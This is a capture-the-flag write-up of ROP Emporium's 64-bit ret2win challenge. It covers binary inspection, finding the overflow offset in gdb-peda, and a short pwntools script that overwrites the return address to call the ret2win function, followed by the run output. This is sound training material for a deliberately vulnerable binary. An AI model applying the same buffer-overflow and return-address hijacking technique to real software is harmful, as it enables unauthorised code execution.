ropemporium-ret2win-64bit

#weird-machines #rop-gadget 

# ropemporium - ret2win 64bit
https://github.com/aditya0x80/
https://github.com/aditya0x80/writeups/blob/main/ropemporium/ret2win.py

 
## Tools
- ropgadget 
- gdb-peda 
- ghidra
- python - pwntool

####  This is a write-up on ropemprium's 64bit ret2win challenge. The challenge includes a straightforward ret2win binary file. 

- Here we can see that `nx` is enabled so we cant inject a shellcode

```
﯇ checksec ret2win 
[*] '/home/pwn0x80/Documents/ctfs/rop/ret2wins/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```
![8f3a87b3ae91ae35cfe56d0970c4f51d.png](/_resources/7657332b84044b328c9b317ab9445162.png)


- using `file` command we can see it is a not stripped ELF binary  


```
file ret2win 
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped
```

## static analysis

 - -  It has three important local functions for which we must investigate further. `00000000004006e8 pwnme`, `0000000000400756 ret2win`  &  `0000000000400697 main` 


```
Symbol table '.symtab' contains 69 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 0000000000400238     0 SECTION LOCAL  DEFAULT    1 
     2: 0000000000400254     0 SECTION LOCAL  DEFAULT    2 
     3: 0000000000400274     0 SECTION LOCAL  DEFAULT    3 
     4: 0000000000400298     0 SECTION LOCAL  DEFAULT    4 
     5: 00000000004002c0     0 SECTION LOCAL  DEFAULT    5 
     6: 00000000004003b0     0 SECTION LOCAL  DEFAULT    6 
     7: 0000000000400416     0 SECTION LOCAL  DEFAULT    7 
     8: 0000000000400430     0 SECTION LOCAL  DEFAULT    8 
     9: 0000000000400450     0 SECTION LOCAL  DEFAULT    9 
    10: 0000000000400498     0 SECTION LOCAL  DEFAULT   10 
    11: 0000000000400528     0 SECTION LOCAL  DEFAULT   11 
    12: 0000000000400540     0 SECTION LOCAL  DEFAULT   12 
    13: 00000000004005b0     0 SECTION LOCAL  DEFAULT   13 
    14: 00000000004007f4     0 SECTION LOCAL  DEFAULT   14 
    15: 0000000000400800     0 SECTION LOCAL  DEFAULT   15 
    16: 0000000000400958     0 SECTION LOCAL  DEFAULT   16 
    17: 00000000004009a8     0 SECTION LOCAL  DEFAULT   17 
    18: 0000000000600e10     0 SECTION LOCAL  DEFAULT   18 
    19: 0000000000600e18     0 SECTION LOCAL  DEFAULT   19 
    20: 0000000000600e20     0 SECTION LOCAL  DEFAULT   20 
    21: 0000000000600ff0     0 SECTION LOCAL  DEFAULT   21 
    22: 0000000000601000     0 SECTION LOCAL  DEFAULT   22 
    23: 0000000000601048     0 SECTION LOCAL  DEFAULT   23 
    24: 0000000000601058     0 SECTION LOCAL  DEFAULT   24 
    25: 0000000000000000     0 SECTION LOCAL  DEFAULT   25 
    26: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    27: 00000000004005f0     0 FUNC    LOCAL  DEFAULT   13 deregister_tm_clones
    28: 0000000000400620     0 FUNC    LOCAL  DEFAULT   13 register_tm_clones
    29: 0000000000400660     0 FUNC    LOCAL  DEFAULT   13 __do_global_dtors_aux
    30: 0000000000601060     1 OBJECT  LOCAL  DEFAULT   24 completed.7698
    31: 0000000000600e18     0 OBJECT  LOCAL  DEFAULT   19 __do_global_dtor[...]
    32: 0000000000400690     0 FUNC    LOCAL  DEFAULT   13 frame_dummy
    33: 0000000000600e10     0 OBJECT  LOCAL  DEFAULT   18 __frame_dummy_in[...]
    34: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS ret2win.c
    35: 00000000004006e8   110 FUNC    LOCAL  DEFAULT   13 pwnme
    36: 0000000000400756    27 FUNC    LOCAL  DEFAULT   13 ret2win
    37: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    38: 0000000000400ae4     0 OBJECT  LOCAL  DEFAULT   17 __FRAME_END__
    39: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS 
    40: 0000000000600e18     0 NOTYPE  LOCAL  DEFAULT   18 __init_array_end
    41: 0000000000600e20     0 OBJECT  LOCAL  DEFAULT   20 _DYNAMIC
    42: 0000000000600e10     0 NOTYPE  LOCAL  DEFAULT   18 __init_array_start
    43: 0000000000400958     0 NOTYPE  LOCAL  DEFAULT   16 __GNU_EH_FRAME_HDR
    44: 0000000000601000     0 OBJECT  LOCAL  DEFAULT   22 _GLOBAL_OFFSET_TABLE_
    45: 00000000004007f0     2 FUNC    GLOBAL DEFAULT   13 __libc_csu_fini
    46: 0000000000601058     8 OBJECT  GLOBAL DEFAULT   24 stdout@@GLIBC_2.2.5
    47: 0000000000601048     0 NOTYPE  WEAK   DEFAULT   23 data_start
    48: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@@GLIBC_2.2.5
    49: 0000000000601058     0 NOTYPE  GLOBAL DEFAULT   23 _edata
    50: 00000000004007f4     0 FUNC    GLOBAL DEFAULT   14 _fini
    51: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND system@@GLIBC_2.2.5
    52: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@@GLIBC_2.2.5
    53: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memset@@GLIBC_2.2.5
    54: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND read@@GLIBC_2.2.5
    55: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_mai[...]
    56: 0000000000601048     0 NOTYPE  GLOBAL DEFAULT   23 __data_start
    57: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    58: 0000000000601050     0 OBJECT  GLOBAL HIDDEN    23 __dso_handle
    59: 0000000000400800     4 OBJECT  GLOBAL DEFAULT   15 _IO_stdin_used
    60: 0000000000400780   101 FUNC    GLOBAL DEFAULT   13 __libc_csu_init
    61: 0000000000601068     0 NOTYPE  GLOBAL DEFAULT   24 _end
    62: 00000000004005e0     2 FUNC    GLOBAL HIDDEN    13 _dl_relocate_sta[...]
    63: 00000000004005b0    43 FUNC    GLOBAL DEFAULT   13 _start
    64: 0000000000601058     0 NOTYPE  GLOBAL DEFAULT   24 __bss_start
    65: 0000000000400697    81 FUNC    GLOBAL DEFAULT   13 main
    66: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND setvbuf@@GLIBC_2.2.5
    67: 0000000000601058     0 OBJECT  GLOBAL HIDDEN    23 __TMC_END__
    68: 0000000000400528     0 FUNC    GLOBAL DEFAULT   11 _init
```
==main function==
- -  on disassmble main we found that it calls pwnme function 
![59ec07d41a175d2d4fb7fc342ccdf5dd.png](/_resources/df080bf8269a4f44a484583adef4a5b6.png)

==pwnme function==

- - We can clearly see a buffer overflow vulnerability in pwnme function.
![d7c1488142ecdfee89738e0cd8fd40c6.png](/_resources/15725d49c91d4dd39ce69b2cea161be6.png)


# Exploit 
ROP ATTACK
GADGET - RET 
We overflow a stack to force RIP to call a required function in order to obtain the flag. 


# Finding offset
```
> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA
Thank you!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0xb ('\x0b')
RBX: 0x400780 (<__libc_csu_init>:	push   r15)
RCX: 0x7ffff7eb9c27 (<__GI___libc_write+23>:	cmp    rax,0xfffffffffffff000)
RDX: 0x0 
RSI: 0x7ffff7f93743 --> 0xf95670000000000a 
RDI: 0x7ffff7f95670 --> 0x0 
RBP: 0x6141414541412941 ('A)AAEAAa')
RSP: 0x7fffffffddd8 ("AA0AAFAAbA\n")
RIP: 0x400755 (<pwnme+109>:	ret)
R8 : 0xb ('\x0b')
R9 : 0x7ffff7fdab50 (endbr64)
R10: 0xfffffffffffffb6b 
R11: 0x246 
R12: 0x4005b0 (<_start>:	xor    ebp,ebp)
R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40074e <pwnme+102>:	call   0x400550 <puts@plt>
   0x400753 <pwnme+107>:	nop
   0x400754 <pwnme+108>:	leave  
=> 0x400755 <pwnme+109>:	ret    
   0x400756 <ret2win>:	push   rbp
   0x400757 <ret2win+1>:	mov    rbp,rsp
   0x40075a <ret2win+4>:	mov    edi,0x400926
   0x40075f <ret2win+9>:	call   0x400550 <puts@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffddd8 ("AA0AAFAAbA\n")
0008| 0x7fffffffdde0 --> 0xa4162 ('bA\n')
0016| 0x7fffffffdde8 --> 0x7ffff7dda565 (<__libc_start_main+213>:	mov    edi,eax)
0024| 0x7fffffffddf0 --> 0x7fffffffded8 --> 0x7fffffffe21e ("/home/pwn0x80/Documents/ctfs/rop/ret2wins/ret2win")
0032| 0x7fffffffddf8 --> 0x1f7fc7000 
0040| 0x7fffffffde00 --> 0x400697 (<main>:	push   rbp)
0048| 0x7fffffffde08 --> 0x7fffffffe1f9 --> 0x48228dfe71299143 
0056| 0x7fffffffde10 --> 0x400780 (<__libc_csu_init>:	push   r15)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400755 in pwnme ()
gdb-peda$ pattern search AA0AAFAAbA\n
Registers contain pattern buffer:
RBP+0 found at offset: 32
Registers point to pattern buffer:
[RSP] --> offset 40 - size ~12
Pattern buffer found at:
0x00007fffffffddb0 : offset    0 - size   50 ($sp + -0x28 [-10 dwords])
References to pattern buffer found at:
0x00007fffffffb608 : 0x00007fffffffddb0 ($sp + -0x27d0 [-2548 dwords])
0x00007fffffffb720 : 0x00007fffffffddb0 ($sp + -0x26b8 [-2478 dwords])
0x00007fffffffda00 : 0x00007fffffffddb0 ($sp + -0x3d8 [-246 dwords])
0x00007fffffffda18 : 0x00007fffffffddb0 ($sp + -0x3c0 [-240 dwords])

```
The offset is `40`

The stack frame for this exploit should look like this. 
![e177c09f9cd819b24273de17b1286d61.png](/_resources/35beef3276c1461b9bb34b3b7511b2e0.png)


Here's an refernce of a function call stack for your convenience. 
![7596f28e1c76bc43f2a487df4a178abd.png](/_resources/286731686f3b40dcb942cbde848a61d7.png)


- Exploit source code written in python3 using pwntool 



```
# https://ropemporium.com/challenge/ret2win.html
# ROPE{a_placeholder_32byte_flag!}
# x86_64
# ropemporium.com
# https://github.com/aditya0x80/writeups/blob/main/ropemporium/ret2win.py
from pwn import *

exp = process("./ret2win")
ret2win = p64(0x400756)
padding = b'A'*40
ret = p64(0x40053e)
payload = padding + ret + ret2win
exp.sendline(payload)
print(exp.recvall().decode())

```

```
[*] '/home/pwn0x80/Documents/ctfs/rop/ret2wins/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/pwn0x80/Documents/ctfs/rop/ret2wins/ret2win': pid 31101
[+] Receiving all data: Done (296B)
[*] Process '/home/pwn0x80/Documents/ctfs/rop/ret2wins/ret2win' stopped with exit code -11 (SIGSEGV) (pid 31101)
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag: ROPE{a_placeholder_32byte_flag!}


```



https://github.com/aditya0x80/writeups/blob/main/ropemporium/ret2win.py
link to the challenge: https://ropemporium.com/challenge/ret2win.html
